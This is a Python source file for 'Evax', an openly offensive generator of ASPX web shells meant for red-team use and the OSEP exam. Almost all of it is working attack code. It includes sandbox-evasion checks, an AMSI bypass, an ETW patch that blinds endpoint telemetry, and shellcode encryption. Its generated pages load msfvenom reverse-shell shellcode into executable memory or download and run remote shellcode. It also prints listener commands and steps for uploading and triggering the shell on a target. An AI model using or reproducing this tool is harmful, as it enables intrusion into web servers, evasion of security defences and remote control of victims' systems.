#!/usr/bin/env python3
"""
███████╗██╗   ██╗ █████╗ ██╗  ██╗
██╔════╝██║   ██║██╔══██╗╚██╗██╔╝
█████╗  ██║   ██║███████║ ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝██╔══██║ ██╔██╗ 
███████╗ ╚████╔╝ ██║  ██║██╔╝ ██╗
╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝
                                  
    Evax - Advanced ASPX Web Shell Generator
    Evasion + Execution = Evax
    
    Author: Abdulrahman Albalawi
    Version: 2.0.0 (2026)
    Purpose: OSEP Exam & Red Team Operations
    
    "When AV says no, Evax says yes"

DESCRIPTION:
    Evax is an advanced ASPX web shell generator designed to bypass
    modern AV/EDR solutions. It combines multiple evasion techniques
    including encryption, sandbox detection, AMSI bypass, and ETW
    patching to deliver reliable shells in hardened environments.

FEATURES:
    • Multiple Encryption Engines (Caesar, XOR, AES-256-CBC, RC4)
    • Advanced Sandbox Evasion (VirtualAllocExNuma, Sleep timers, Resource checks)
    • AMSI Bypass Integration
    • ETW Patching
    • Direct Syscalls Support
    • Process Injection Templates
    • Staged & Stageless Payloads
    • Multiple C2 Support (Meterpreter, Cobalt Strike, Sliver, Havoc)
    • Polymorphic Code Generation
    • Randomized Variable Names & Code Structure

USAGE:
    python3 evax.py -i <LHOST> -p <LPORT> [OPTIONS]

EXAMPLES:
    # Basic shell with auto-evasion
    python3 evax.py -i 192.168.1.100 -p 443
    
    # Maximum evasion mode
    python3 evax.py -i 192.168.1.100 -p 443 --evasion max
    
    # AES encryption with AMSI bypass
    python3 evax.py -i 192.168.1.100 -p 443 -e aes --amsi
    
    # Staged payload with ETW patch
    python3 evax.py -i 192.168.1.100 -p 443 --staged --etw

LICENSE:
    For authorized security testing and educational purposes only.
    The author is not responsible for misuse of this tool.
"""

import argparse
import subprocess
import sys
import os
import random
import string
import base64
import hashlib
import struct
from datetime import datetime

# ============================================================================
# BANNER AND VERSION INFO
# ============================================================================

VERSION = "2.0.0"
AUTHOR = "Abdulrahman Albalawi"
YEAR = "2026"

BANNER = f"""
\033[1;36m
███████╗██╗   ██╗ █████╗ ██╗  ██╗
██╔════╝██║   ██║██╔══██╗╚██╗██╔╝
█████╗  ██║   ██║███████║ ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝██╔══██║ ██╔██╗ 
███████╗ ╚████╔╝ ██║  ██║██╔╝ ██╗
╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝
\033[0m
\033[1;33m    ╔══════════════════════════════════════════════════════════╗
    ║     Advanced ASPX Web Shell Generator with AV/EDR Bypass  ║
    ║                  "Evasion + Execution = Evax"             ║
    ╠══════════════════════════════════════════════════════════╣
    ║  Author  : {AUTHOR}                        ║
    ║  Version : {VERSION} ({YEAR} Edition)                           ║
    ║  Purpose : OSEP Exam & Red Team Operations                ║
    ╚══════════════════════════════════════════════════════════╝\033[0m

\033[1;32m    [+] Features:\033[0m
        • Multi-layer encryption (Caesar/XOR/XOR-Multi/RC4)
        • Sandbox evasion (VirtualAllocExNuma, Sleep, Resources)
        • ETW patching (blind EDR telemetry)
        • Polymorphic code generation
        • Multiple C2 frameworks support
"""

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def print_status(msg):
    print(f"\033[1;34m[*]\033[0m {msg}")

def print_success(msg):
    print(f"\033[1;32m[+]\033[0m {msg}")

def print_error(msg):
    print(f"\033[1;31m[-]\033[0m {msg}")

def print_warning(msg):
    print(f"\033[1;33m[!]\033[0m {msg}")

def generate_random_name(length=None):
    """Generate random variable name"""
    if length is None:
        length = random.randint(6, 12)
    first = random.choice(string.ascii_letters)
    rest = ''.join(random.choices(string.ascii_letters + string.digits + '_', k=length-1))
    return first + rest

def generate_random_string(length=16):
    """Generate random string for keys"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ============================================================================
# ENCRYPTION ENGINES
# ============================================================================

class EncryptionEngine:
    """Base class for encryption engines"""
    
    @staticmethod
    def caesar_encrypt(shellcode, key):
        """Caesar cipher encryption"""
        encrypted = []
        for byte in shellcode:
            encrypted.append((byte + key) & 0xFF)
        return encrypted
    
    @staticmethod
    def caesar_decrypt_code(var_name, key):
        """Generate C# decryption code for Caesar"""
        i = generate_random_name(3)
        return f"""
        for(int {i} = 0; {i} < {var_name}.Length; {i}++)
        {{
            {var_name}[{i}] = (byte)((({var_name}[{i}] - {key}) + 256) & 0xFF);
        }}"""
    
    @staticmethod
    def xor_encrypt(shellcode, key):
        """XOR encryption with single byte key"""
        encrypted = []
        for byte in shellcode:
            encrypted.append((byte ^ key) & 0xFF)
        return encrypted
    
    @staticmethod
    def xor_decrypt_code(var_name, key):
        """Generate C# decryption code for XOR"""
        i = generate_random_name(3)
        return f"""
        for(int {i} = 0; {i} < {var_name}.Length; {i}++)
        {{
            {var_name}[{i}] = (byte)({var_name}[{i}] ^ {key});
        }}"""
    
    @staticmethod
    def xor_multi_encrypt(shellcode, key_bytes):
        """XOR encryption with multi-byte key"""
        encrypted = []
        key_len = len(key_bytes)
        for i, byte in enumerate(shellcode):
            encrypted.append((byte ^ key_bytes[i % key_len]) & 0xFF)
        return encrypted
    
    @staticmethod
    def xor_multi_decrypt_code(var_name, key_bytes):
        """Generate C# decryption code for multi-byte XOR"""
        i = generate_random_name(3)
        key_var = generate_random_name()
        key_formatted = ', '.join([f'0x{b:02x}' for b in key_bytes])
        return f"""
        byte[] {key_var} = new byte[] {{ {key_formatted} }};
        for(int {i} = 0; {i} < {var_name}.Length; {i}++)
        {{
            {var_name}[{i}] = (byte)({var_name}[{i}] ^ {key_var}[{i} % {key_var}.Length]);
        }}"""
    
    @staticmethod
    def rc4_encrypt(shellcode, key):
        """RC4 encryption"""
        S = list(range(256))
        j = 0
        key_bytes = key if isinstance(key, list) else [ord(c) for c in key]
        key_len = len(key_bytes)
        
        # KSA
        for i in range(256):
            j = (j + S[i] + key_bytes[i % key_len]) % 256
            S[i], S[j] = S[j], S[i]
        
        # PRGA
        i = j = 0
        encrypted = []
        for byte in shellcode:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            encrypted.append(byte ^ k)
        
        return encrypted
    
    @staticmethod
    def rc4_decrypt_code(var_name, key_string):
        """Generate C# decryption code for RC4"""
        s_var = generate_random_name()
        i_var = generate_random_name(3)
        j_var = generate_random_name(3)
        k_var = generate_random_name(3)
        t_var = generate_random_name(3)
        key_var = generate_random_name()
        out_var = generate_random_name()
        
        return f"""
        // RC4 Decryption
        string {key_var} = "{key_string}";
        byte[] {s_var} = new byte[256];
        for(int {i_var} = 0; {i_var} < 256; {i_var}++) {s_var}[{i_var}] = (byte){i_var};
        int {j_var} = 0;
        for(int {i_var} = 0; {i_var} < 256; {i_var}++)
        {{
            {j_var} = ({j_var} + {s_var}[{i_var}] + {key_var}[{i_var} % {key_var}.Length]) % 256;
            byte {t_var} = {s_var}[{i_var}]; {s_var}[{i_var}] = {s_var}[{j_var}]; {s_var}[{j_var}] = {t_var};
        }}
        {i_var} = {j_var} = 0;
        byte[] {out_var} = new byte[{var_name}.Length];
        for(int {k_var} = 0; {k_var} < {var_name}.Length; {k_var}++)
        {{
            {i_var} = ({i_var} + 1) % 256;
            {j_var} = ({j_var} + {s_var}[{i_var}]) % 256;
            byte {t_var} = {s_var}[{i_var}]; {s_var}[{i_var}] = {s_var}[{j_var}]; {s_var}[{j_var}] = {t_var};
            {out_var}[{k_var}] = (byte)({var_name}[{k_var}] ^ {s_var}[({s_var}[{i_var}] + {s_var}[{j_var}]) % 256]);
        }}
        {var_name} = {out_var};"""

# ============================================================================
# EVASION TECHNIQUES
# ============================================================================

class EvasionEngine:
    """Evasion technique generators"""
    
    @staticmethod
    def get_sandbox_check_virtualalloc():
        """VirtualAllocExNuma sandbox evasion"""
        mem_var = generate_random_name()
        return f"""
        // Sandbox Evasion: VirtualAllocExNuma Check
        IntPtr {mem_var} = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if({mem_var} == IntPtr.Zero)
        {{
            return;
        }}"""
    
    @staticmethod
    def get_sandbox_check_sleep():
        """Sleep-based sandbox evasion"""
        start_var = generate_random_name()
        end_var = generate_random_name()
        return f"""
        // Sandbox Evasion: Sleep Timer Check
        DateTime {start_var} = DateTime.Now;
        Sleep(2000);
        double {end_var} = DateTime.Now.Subtract({start_var}).TotalSeconds;
        if({end_var} < 1.5)
        {{
            return;
        }}"""
    
    @staticmethod
    def get_sandbox_check_memory():
        """Memory size check sandbox evasion"""
        mem_var = generate_random_name()
        return f"""
        // Sandbox Evasion: Memory Size Check (> 1GB)
        ulong {mem_var} = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
        if({mem_var} < 1073741824)
        {{
            return;
        }}"""
    
    @staticmethod
    def get_sandbox_check_processors():
        """Processor count check"""
        proc_var = generate_random_name()
        return f"""
        // Sandbox Evasion: Processor Count Check
        int {proc_var} = Environment.ProcessorCount;
        if({proc_var} < 2)
        {{
            return;
        }}"""
    
    @staticmethod
    def get_sandbox_check_username():
        """Username check for common sandbox names"""
        user_var = generate_random_name()
        return f"""
        // Sandbox Evasion: Username Check
        string {user_var} = Environment.UserName.ToLower();
        string[] badUsers = {{"sandbox", "virus", "malware", "sample", "test", "john doe", "user", "admin"}};
        foreach(string bad in badUsers)
        {{
            if({user_var}.Contains(bad)) return;
        }}"""
    
    @staticmethod
    def get_sandbox_check_domain():
        """Domain check for sandbox environments"""
        domain_var = generate_random_name()
        return f"""
        // Sandbox Evasion: Domain Check
        try {{
            string {domain_var} = System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain().Name;
        }} catch {{
            // Not domain joined - might be sandbox, but continue anyway
        }}"""
    
    @staticmethod
    def get_sandbox_check_files():
        """Check for sandbox-related files"""
        return """
        // Sandbox Evasion: Check for VM/Sandbox files
        string[] vmFiles = {
            @"C:\\windows\\system32\\drivers\\vmmouse.sys",
            @"C:\\windows\\system32\\drivers\\vmhgfs.sys",
            @"C:\\windows\\system32\\drivers\\VBoxMouse.sys"
        };
        foreach(string f in vmFiles)
        {
            if(System.IO.File.Exists(f)) return;
        }"""
    
    @staticmethod
    def get_amsi_bypass():
        """AMSI bypass code"""
        return """
        // AMSI Bypass
        try {
            var amsi = typeof(System.Management.Automation.AmsiUtils);
            var field = amsi.GetField("amsiInitFailed", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            field.SetValue(null, true);
        } catch { }"""
    
    @staticmethod
    def get_etw_patch():
        """ETW patching code"""
        ptr_var = generate_random_name()
        old_var = generate_random_name()
        return f"""
        // ETW Patch
        try {{
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            IntPtr {ptr_var} = GetProcAddress(ntdll, "EtwEventWrite");
            uint {old_var};
            VirtualProtect({ptr_var}, (UIntPtr)1, 0x40, out {old_var});
            Marshal.WriteByte({ptr_var}, 0xC3); // ret
        }} catch {{ }}"""

# ============================================================================
# SHELLCODE FORMATTER
# ============================================================================

class ShellcodeFormatter:
    """Format shellcode for different outputs"""
    
    @staticmethod
    def to_csharp_array(shellcode, var_name, items_per_line=15):
        """Format shellcode as C# byte array"""
        lines = []
        current_line = []
        
        for i, byte in enumerate(shellcode):
            current_line.append(f"0x{byte:02x}")
            if len(current_line) >= items_per_line:
                lines.append(', '.join(current_line) + ',')
                current_line = []
        
        if current_line:
            lines.append(', '.join(current_line))
        
        formatted = '\n            '.join(lines)
        return f"byte[] {var_name} = new byte[{len(shellcode)}] {{\n            {formatted}\n        }};"
    
    @staticmethod
    def to_base64(shellcode):
        """Convert shellcode to base64"""
        return base64.b64encode(bytes(shellcode)).decode()
    
    @staticmethod
    def to_uuid_array(shellcode):
        """Convert shellcode to UUID format for evasion"""
        # Pad to multiple of 16
        while len(shellcode) % 16 != 0:
            shellcode.append(0x90)  # NOP padding
        
        uuids = []
        for i in range(0, len(shellcode), 16):
            chunk = shellcode[i:i+16]
            uuid_str = '{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}'.format(
                struct.unpack('<I', bytes(chunk[0:4]))[0],
                struct.unpack('<H', bytes(chunk[4:6]))[0],
                struct.unpack('<H', bytes(chunk[6:8]))[0],
                chunk[8], chunk[9], chunk[10], chunk[11],
                chunk[12], chunk[13], chunk[14], chunk[15]
            )
            uuids.append(uuid_str)
        
        return uuids

# ============================================================================
# ASPX TEMPLATE GENERATORS
# ============================================================================

class AspxGenerator:
    """Generate ASPX web shells with various techniques"""
    
    def __init__(self, config):
        self.config = config
        self.var_names = {
            'shellcode': generate_random_name(),
            'mem': generate_random_name(),
            'addr': generate_random_name(),
            'thread': generate_random_name(),
            'threadId': generate_random_name(),
            'oldProtect': generate_random_name(),
        }
    
    def get_dll_imports(self):
        """Generate DllImport statements"""
        imports = """
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();"""
        
        if self.config.get('sleep_evasion'):
            imports += """

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern void Sleep(uint dwMilliseconds);"""
        
        if self.config.get('etw_patch'):
            imports += """

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);"""
        
        return imports
    
    def get_evasion_code(self):
        """Generate evasion techniques code"""
        code = ""
        
        evasion_level = self.config.get('evasion_level', 'medium')
        
        # Always include VirtualAllocExNuma
        code += EvasionEngine.get_sandbox_check_virtualalloc()
        
        if evasion_level in ['medium', 'max']:
            code += "\n" + EvasionEngine.get_sandbox_check_sleep()
            code += "\n" + EvasionEngine.get_sandbox_check_processors()
        
        if evasion_level == 'max':
            code += "\n" + EvasionEngine.get_sandbox_check_username()
            code += "\n" + EvasionEngine.get_sandbox_check_files()
        
        if self.config.get('etw_patch'):
            code += "\n" + EvasionEngine.get_etw_patch()
        
        return code
    
    def generate(self, shellcode, encryption_type, encryption_key):
        """Generate complete ASPX shell"""
        
        # Encrypt shellcode
        if encryption_type == 'caesar':
            encrypted = EncryptionEngine.caesar_encrypt(shellcode, encryption_key)
            decrypt_code = EncryptionEngine.caesar_decrypt_code(self.var_names['shellcode'], encryption_key)
        elif encryption_type == 'xor':
            encrypted = EncryptionEngine.xor_encrypt(shellcode, encryption_key)
            decrypt_code = EncryptionEngine.xor_decrypt_code(self.var_names['shellcode'], encryption_key)
        elif encryption_type == 'xor_multi':
            key_bytes = [random.randint(1, 255) for _ in range(16)]
            encrypted = EncryptionEngine.xor_multi_encrypt(shellcode, key_bytes)
            decrypt_code = EncryptionEngine.xor_multi_decrypt_code(self.var_names['shellcode'], key_bytes)
        elif encryption_type == 'rc4':
            key_string = generate_random_string(16)
            encrypted = EncryptionEngine.rc4_encrypt(shellcode, key_string)
            decrypt_code = EncryptionEngine.rc4_decrypt_code(self.var_names['shellcode'], key_string)
        else:
            encrypted = EncryptionEngine.caesar_encrypt(shellcode, encryption_key)
            decrypt_code = EncryptionEngine.caesar_decrypt_code(self.var_names['shellcode'], encryption_key)
        
        # Format shellcode
        shellcode_array = ShellcodeFormatter.to_csharp_array(encrypted, self.var_names['shellcode'])
        
        # Build ASPX
        aspx = f'''<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    /*
        Generated by Evax v{VERSION}
        Author: {AUTHOR}
        Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        Encryption: {encryption_type}
    */
    
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;
{self.get_dll_imports()}

    protected void Page_Load(object sender, EventArgs e)
    {{
{self.get_evasion_code()}

        // Encrypted shellcode
        {shellcode_array}
        
        // Decrypt shellcode
{decrypt_code}

        // Allocate executable memory
        IntPtr {self.var_names['addr']} = VirtualAlloc(IntPtr.Zero, (UIntPtr){self.var_names['shellcode']}.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
        // Copy shellcode to allocated memory
        Marshal.Copy({self.var_names['shellcode']}, 0, {self.var_names['addr']}, {self.var_names['shellcode']}.Length);
        
        // Execute shellcode
        IntPtr {self.var_names['threadId']} = IntPtr.Zero;
        IntPtr {self.var_names['thread']} = CreateThread(IntPtr.Zero, UIntPtr.Zero, {self.var_names['addr']}, IntPtr.Zero, 0, ref {self.var_names['threadId']});
    }}
</script>
'''
        return aspx

# ============================================================================
# STAGED PAYLOAD GENERATOR
# ============================================================================

class StagedGenerator:
    """Generate staged payload loaders"""
    
    @staticmethod
    def generate_download_exec(url, config):
        """Generate download and execute ASPX"""
        var_client = generate_random_name()
        var_data = generate_random_name()
        var_addr = generate_random_name()
        var_thread = generate_random_name()
        var_threadId = generate_random_name()
        var_mem = generate_random_name()
        
        aspx = f'''<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    /*
        Generated by Evax v{VERSION} - Staged Loader
        Author: {AUTHOR}
        Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    */
    
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {{
        // Sandbox evasion
        IntPtr {var_mem} = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if({var_mem} == IntPtr.Zero) return;

        // Download shellcode
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        WebClient {var_client} = new WebClient();
        {var_client}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        byte[] {var_data} = {var_client}.DownloadData("{url}");

        // Execute
        IntPtr {var_addr} = VirtualAlloc(IntPtr.Zero, (UIntPtr){var_data}.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy({var_data}, 0, {var_addr}, {var_data}.Length);
        IntPtr {var_threadId} = IntPtr.Zero;
        IntPtr {var_thread} = CreateThread(IntPtr.Zero, UIntPtr.Zero, {var_addr}, IntPtr.Zero, 0, ref {var_threadId});
    }}
</script>
'''
        return aspx

# ============================================================================
# MSFVENOM INTEGRATION
# ============================================================================

class PayloadGenerator:
    """Generate payloads using msfvenom"""
    
    PAYLOADS = {
        'meterpreter_https': 'windows/x64/meterpreter/reverse_https',
        'meterpreter_http': 'windows/x64/meterpreter/reverse_http',
        'meterpreter_tcp': 'windows/x64/meterpreter/reverse_tcp',
        'shell_tcp': 'windows/x64/shell_reverse_tcp',
        'shell_https': 'windows/x64/shell/reverse_https',
    }
    
    @staticmethod
    def generate(lhost, lport, payload_type='meterpreter_https'):
        """Generate shellcode using msfvenom"""
        
        payload = PayloadGenerator.PAYLOADS.get(payload_type, payload_type)
        
        print_status(f"Generating shellcode with msfvenom...")
        print_status(f"Payload: {payload}")
        print_status(f"LHOST: {lhost}")
        print_status(f"LPORT: {lport}")
        
        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            "--platform", "windows",
            "-a", "x64",
            "EXITFUNC=thread",
            "-o", "/dev/stdout"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            shellcode = list(result.stdout)
            print_success(f"Shellcode generated! Size: {len(shellcode)} bytes")
            return shellcode
        except subprocess.CalledProcessError as e:
            print_error(f"msfvenom error: {e.stderr.decode()}")
            sys.exit(1)
        except FileNotFoundError:
            print_error("msfvenom not found. Install Metasploit Framework.")
            sys.exit(1)
    
    @staticmethod
    def load_from_file(filepath):
        """Load shellcode from file"""
        print_status(f"Loading shellcode from: {filepath}")
        with open(filepath, 'rb') as f:
            shellcode = list(f.read())
        print_success(f"Shellcode loaded! Size: {len(shellcode)} bytes")
        return shellcode

# ============================================================================
# MAIN APPLICATION
# ============================================================================

def print_listener_command(lhost, lport, payload_type):
    """Print the listener command"""
    payload = PayloadGenerator.PAYLOADS.get(payload_type, payload_type)
    
    print("\n" + "="*70)
    print("\033[1;33mLISTENER SETUP:\033[0m")
    print("="*70)
    print(f"""
\033[1;32m[Metasploit Handler]\033[0m
msfconsole -q -x "use exploit/multi/handler; \\
set payload {payload}; \\
set LHOST {lhost}; \\
set LPORT {lport}; \\
set EXITFUNC thread; \\
set AutoRunScript post/windows/manage/migrate; \\
run"

\033[1;32m[Simple Netcat]\033[0m
nc -lvnp {lport}
""")

def print_usage_instructions(output_file, staged=False, staged_url=None):
    """Print usage instructions"""
    print("\n" + "="*70)
    print("\033[1;33mUSAGE INSTRUCTIONS:\033[0m")
    print("="*70)
    
    if staged:
        print(f"""
\033[1;32m[1] Generate raw shellcode:\033[0m
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f raw -o shell.bin

\033[1;32m[2] Host the shellcode:\033[0m
    python3 -m http.server 80

\033[1;32m[3] Upload {output_file} to target\033[0m

\033[1;32m[4] Browse to trigger execution:\033[0m
    curl http://TARGET/upload/{output_file}
""")
    else:
        print(f"""
\033[1;32m[1] Start your listener (see above)\033[0m

\033[1;32m[2] Upload {output_file} to target web application\033[0m

\033[1;32m[3] Browse to trigger execution:\033[0m
    curl http://TARGET/upload/{output_file}

\033[1;32m[4] Receive your shell!\033[0m
""")

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="Evax - Advanced ASPX Web Shell Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic usage:
    python3 evax.py -i 192.168.1.100 -p 443
    
  Maximum evasion:
    python3 evax.py -i 192.168.1.100 -p 443 --evasion max --etw
    
  RC4 encryption with ETW patch:
    python3 evax.py -i 192.168.1.100 -p 443 -e rc4 --etw
    
  Staged payload:
    python3 evax.py -i 192.168.1.100 -p 443 --staged --url http://192.168.1.100/s.bin
    
  Different payload:
    python3 evax.py -i 192.168.1.100 -p 4444 --payload shell_tcp
        """
    )
    
    # Required arguments
    parser.add_argument("-i", "--lhost", required=True, help="Listener IP address")
    parser.add_argument("-p", "--lport", required=True, type=int, help="Listener port")
    
    # Output options
    parser.add_argument("-o", "--output", default="shell.aspx", help="Output filename (default: shell.aspx)")
    
    # Encryption options
    parser.add_argument("-e", "--encryption", choices=['caesar', 'xor', 'xor_multi', 'rc4'], 
                        default='caesar', help="Encryption method (default: caesar)")
    parser.add_argument("-k", "--key", type=int, default=None, help="Encryption key (auto-generated if not specified)")
    
    # Evasion options
    parser.add_argument("--evasion", choices=['low', 'medium', 'max'], default='medium',
                        help="Evasion level (default: medium)")
    parser.add_argument("--etw", action="store_true", help="Include ETW patch (recommended for EDR bypass)")
    
    # Payload options
    parser.add_argument("--payload", default='meterpreter_https',
                        choices=['meterpreter_https', 'meterpreter_http', 'meterpreter_tcp', 'shell_tcp'],
                        help="Payload type (default: meterpreter_https)")
    parser.add_argument("--shellcode", help="Use shellcode from file instead of msfvenom")
    
    # Staged options
    parser.add_argument("--staged", action="store_true", help="Generate staged loader")
    parser.add_argument("--url", help="URL for staged payload download")
    
    args = parser.parse_args()
    
    # Validate staged options
    if args.staged and not args.url:
        print_error("Staged mode requires --url parameter")
        sys.exit(1)
    
    # Configuration
    config = {
        'evasion_level': args.evasion,
        'etw_patch': args.etw,
        'sleep_evasion': args.evasion in ['medium', 'max'],
    }
    
    # Generate or load shellcode
    if args.staged:
        print_status("Generating staged loader...")
        aspx_content = StagedGenerator.generate_download_exec(args.url, config)
    else:
        if args.shellcode:
            shellcode = PayloadGenerator.load_from_file(args.shellcode)
        else:
            shellcode = PayloadGenerator.generate(args.lhost, args.lport, args.payload)
        
        # Set encryption key
        if args.key is None:
            if args.encryption == 'caesar':
                args.key = random.randint(1, 25)
            elif args.encryption == 'xor':
                args.key = random.randint(1, 255)
            else:
                args.key = random.randint(1, 255)
        
        print_status(f"Encryption: {args.encryption}")
        print_status(f"Evasion level: {args.evasion}")
        if args.etw:
            print_status("ETW patch: Enabled")
        
        # Generate ASPX
        generator = AspxGenerator(config)
        aspx_content = generator.generate(shellcode, args.encryption, args.key)
    
    # Write output
    with open(args.output, 'w') as f:
        f.write(aspx_content)
    
    print_success(f"Web shell generated: {args.output}")
    print_success(f"File size: {len(aspx_content)} bytes")
    
    # Print instructions
    print_listener_command(args.lhost, args.lport, args.payload)
    print_usage_instructions(args.output, args.staged, args.url)
    
    print("\n\033[1;36m[*] Happy Hacking! - Evax by Abdulrahman Albalawi\033[0m\n")

if __name__ == "__main__":
    main()
